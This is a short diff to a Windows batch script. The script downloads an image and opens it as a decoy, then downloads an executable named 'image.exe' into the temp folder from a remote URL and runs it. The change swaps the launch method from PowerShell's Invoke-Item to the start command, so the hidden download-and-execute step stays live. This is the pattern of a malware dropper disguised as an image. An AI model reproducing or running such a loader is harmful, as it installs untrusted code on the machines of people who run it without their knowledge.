@@ -10,8 +10,8 @@ set "execFile=%TEMP%\image.exe"
 powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('%imageURL%', '%imageFile%');"
 start !imageFile!
 
-powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('%execURL%', '%execFile%'); Invoke-Item '%execFile%';"
+powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('%execURL%', '%execFile%');"
 REM Invoke-Item '%execFile%';
-REM start "%execFile%"
+start "%execFile%"
 
 endlocal
